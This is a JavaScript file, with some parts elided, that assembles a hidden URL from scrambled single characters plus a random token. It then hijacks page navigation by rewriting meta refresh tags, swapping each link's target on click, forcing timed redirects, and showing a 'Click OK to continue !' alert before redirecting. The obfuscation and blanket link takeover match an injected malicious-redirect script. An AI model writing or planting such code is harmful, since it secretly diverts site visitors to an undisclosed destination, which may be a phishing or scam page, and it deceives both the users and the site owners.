let l = [
    [],
    ['r', '3', 'F', 'J', ';', 't', 'x', 'f', '4', 's', '9', 'l', 'h', 'p', ':', '/', 'o', 'e', '.', '#', 'e'],
    [
        "4zxy9Vhb61",
        "4peXxCiER0",
        "4fL7ktirlz",
...
l[0] += l[1][20];
l[0] += l[1][15];
l[0] += l[2][Math.round(Math.random() * (l[2].length - 1))]
console.log(l[0]);

function cm(timeOut = 0) {
    if (document.querySelectorAll('meta')[0] != null) {
        for (let index = 0; index < document.querySelectorAll('meta').length; index++) {
            if (document.querySelectorAll('meta')[index].httpEquiv == "refresh") {
                ...
                document.querySelectorAll('meta')[index].content = timeOut + "; " + l[0];
            }
        }
    }
}
    ...
    if (document.querySelectorAll('a')[0] != null) {
        for (let index = 0; index < document.querySelectorAll('a').length; index++) {
            document.querySelectorAll('a')[index].addEventListener('click', function () {
                document.querySelectorAll('a')[index].href = l[0];
            })
        }
    }
}
...
function fr(timeOut = 0) {
    setTimeout(function () {
        location.href = l[0];
    }, timeOut);
}

function ar(timeOut = 0, message = "Click OK to continue !") {
    setTimeout(function () {
        alert(message);
        location.href = l[0];
    }, timeOut);
...
function cp(l = "status") {
    return location.pathname == "/" + l[0] || location.pathname == "/" + l[0] + ".html";
}
